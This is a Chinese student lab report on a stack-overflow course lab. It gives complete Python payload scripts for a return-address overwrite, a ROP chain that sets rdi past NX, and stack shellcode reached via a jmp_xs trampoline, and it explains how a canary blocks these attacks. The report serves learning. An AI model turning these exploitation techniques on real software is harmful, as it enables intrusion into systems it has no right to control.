# 栈溢出攻击实验

## 题目解决思路

### Problem 1
- **分析**：
  - `func` 使用 `strcpy` 将外部输入复制到栈上的局部缓冲区（目的地址通过 `lea rax,[rbp-0x8]` 取得）。由于 `strcpy` 不做长度检查，当输入超过缓冲区大小时会覆盖栈上保存的 `rbp` 与返回地址，导致控制流可被劫持。
  - `func1` 内部会打印题目要求的字符串并调用 `exit` 退出，因此只要让 `func` 返回后跳转到 `func1`，即可输出 `Yes!I like ICS!`。

- **解决方案**：
  - 构造输入使 `func` 的返回地址被覆盖为 `func1` 的入口。
  - payload 的代码 :
```python
import struct

# Problem 1 攻击脚本

# 1. 构造 Padding
# 缓冲区从 rbp-8 开始。
# 我们需要填充 8字节(buffer) + 8字节(saved rbp) = 16字节
padding_len = 16
padding = b'A' * padding_len

# 2. 构造目标地址
# func1 的地址是 0x401216
# <Q 代表 Little Endian (小端序), Unsigned Long Long (64位)
target_addr = struct.pack('<Q', 0x401216)

# 3. 组合 Payload
payload = padding + target_addr

# 4. 写入文件
# 题目要求 problem1 接收一个文件名参数
filename = "ans1.txt"
with open(filename, "wb") as f:
    f.write(payload)

print(f"[+] Payload 已写入 {filename}")
print(f"[+] Padding 长度: {padding_len}")
print(f"[+] 跳转目标: 0x401216 (func1)")
print("-" * 30)
print(f"请在终端运行: ./problem1 {filename}")

```

- **结果**：
  ![P1-运行结果](images/p1_run.png.png)

---

### Problem 2
- **分析**：
  - 与 Problem1 类似，`func` 使用 `memcpy` 将固定长度数据复制到栈上小缓冲区（目的地址由 `lea rax,[rbp-0x8]` 取得，复制长度为 `0x38`），存在栈溢出。
  - 本题启用了 NX（栈不可执行），因此不能依赖“在栈上注入并执行代码”，需要采用“代码复用”的方式完成输出。
  - 程序中存在 `func2(int x)`：当 `x == 0x3f8` 时会打印 `Yes!I like ICS!` 并 `exit`。
  - 另外程序提供了一个可用的 `pop rdi; ret` 片段（用于在 x86-64 传参时设置第一个参数寄存器 `rdi`）。

- **解决方案**：
  - 利用溢出构造最短的控制流链：先把 `rdi` 设置为满足 `func2` 判定的值，再转到 `func2`。
  - payload 的代码 ：

```python
import struct

# Problem 2 攻击脚本 (ROP)

# 1. 基础信息
padding_len = 16
padding = b'A' * padding_len

# 2. 构造 ROP 链
# 这里的 <Q 表示 64位小端序打包

# [第一步] Gadget: pop rdi; ret
# 地址来源: 4012c7: 5f pop %rdi
pop_rdi_addr = struct.pack('<Q', 0x4012c7)

# [第二步] 参数值
# func2 要求参数为 0x3f8
arg1 = struct.pack('<Q', 0x3f8)

# [第三步] 目标函数 func2
# 地址来源: 401216 <func2>
func2_addr = struct.pack('<Q', 0x401216)

# 3. 组合 Payload
# 栈布局: [Padding] -> [pop_rdi] -> [0x3f8] -> [func2]
payload = padding + pop_rdi_addr + arg1 + func2_addr

# 4. 写入文件
filename = "ans2.txt"
with open(filename, "wb") as f:
    f.write(payload)

print(f"[+] Payload 已写入 {filename}")
print(f"[+] ROP Chain: pop_rdi -> 0x3f8 -> func2")
print("-" * 30)
print(f"请在终端运行: ./problem2 {filename}")

```

- **结果**：
  ![P2-运行结果](images/p2_run.png.png)

---

### Problem 3
- **分析**：
  - `func` 将 `0x40` 字节通过 `memcpy` 复制到栈上缓冲区（缓冲区起始在 `[rbp-0x20]`，但复制长度大于其可容纳空间），存在栈溢出。
  - `func1(int x)` 内部会判断 `x == 0x72`（十进制 114）；若满足则打印 `Your lucky number is 114`，否则打印 `Error answer!`。
  - 题目提示强调“可用字节长度与栈地址变化（ASLR）”，因此应尽量采用不依赖“猜测栈地址”的策略（例如跳转到代码段的固定位置并正确传参），或在 gdb 环境下证明结果。

- **解决方案**：
  - 目标：让程序执行到 `func1` 且参数满足判定值（114）。
  - 由于 x86-64 传参使用寄存器（第一个参数为 `rdi`），需要在进入 `func1` 前保证 `rdi` 为目标值。
  - payload 代码 :
```python
import struct

# Problem 3 攻击脚本 (Shellcode)

# 1. 构造 Shellcode
# 汇编指令:
# mov rdi, 0x72       (参数 114)
# mov rax, 0x401216   (目标函数 func1)
# call rax            (执行)

# 对应的机器码 (Hex):
shellcode = b"\x48\xc7\xc7\x72\x00\x00\x00"  # mov rdi, 0x72
shellcode += b"\x48\xc7\xc0\x16\x12\x40\x00" # mov rax, 0x401216
shellcode += b"\xff\xd0"                     # call rax

# 2. 计算 Padding
# 缓冲区总大小是 32 字节 (0x20)
# 我们需要用 NOP (\x90) 或者垃圾数据填满剩余空间
buffer_size = 32
pad_len = buffer_size - len(shellcode)
padding = b'\x90' * pad_len # 使用 NOP 填充比较优雅

# 3. 构造栈帧覆盖
# [Shellcode + Pad] (32 bytes)
# [Old RBP] (8 bytes)
# [Ret Addr -> jmp_xs] (8 bytes)

fake_rbp = b'B' * 8
jmp_xs_addr = struct.pack('<Q', 0x401334) # 0x401334 是 jmp_xs 的地址

payload = shellcode + padding + fake_rbp + jmp_xs_addr

# 4. 写入文件
filename = "ans3.txt"
with open(filename, "wb") as f:
    f.write(payload)

print(f"[+] Payload 已写入 {filename}")
print(f"[+] Shellcode length: {len(shellcode)} bytes")
print(f"[+] 跳转路径: func -> jmp_xs (0x401334) -> Stack Buffer")
print("-" * 30)
print(f"请在终端运行: ./problem3 {filename}")

``` 

- **结果**：
  ![P3-运行结果](images/p3_run.png.png)
---

### Problem 4
- **分析**：
  - 本题启用了 Canary（栈保护）。在函数序言中可见从 `fs:0x28` 读取 canary 并保存到栈上（例如 `mov rax, QWORD PTR fs:0x28`，随后 `mov [rbp-0x8], rax`）。
  - 在函数返回前会再次从栈上取出 canary 与 `fs:0x28` 对比（例如 `sub rax, QWORD PTR fs:0x28`），若不相等则调用 `__stack_chk_fail` 终止程序。
  - 因此，传统“覆盖返回地址”的栈溢出手法会先触发 canary 检测而失败。

- **解决方案**：
  - 本题不需要构造溢出 payload。程序逻辑中当输入的“yuanshi（money）”满足条件时会调用 `func1`，输出通关提示。
  - 实测：在程序提示输入整数时输入 `-1`（对应无符号数 `4294967295`）即可满足条件并触发通关输出 。

- **结果**：
  ![P4-运行结果](images/p4_run.png.png)

---

## 思考与总结
- 本实验分别覆盖了：无保护栈溢出、NX 环境下代码复用、在约束条件下的稳定利用思路、以及 Canary 的机制与汇编体现。
- 对比不同保护机制可以看到：
  - NX 会阻止在栈上执行注入代码，使得“复用现有代码片段/函数调用”的方式更常用。
  - Canary 会在函数返回前检测栈帧是否被破坏，使得直接覆盖返回地址的做法难以奏效。
  - 在存在随机化或长度约束时，应尽量减少对不稳定地址的依赖，并通过调试证据验证策略有效性。

## 参考资料

- CTF Wiki: Stack Overflow 入门
- gdb / objdump / readelf 等工具的使用文档
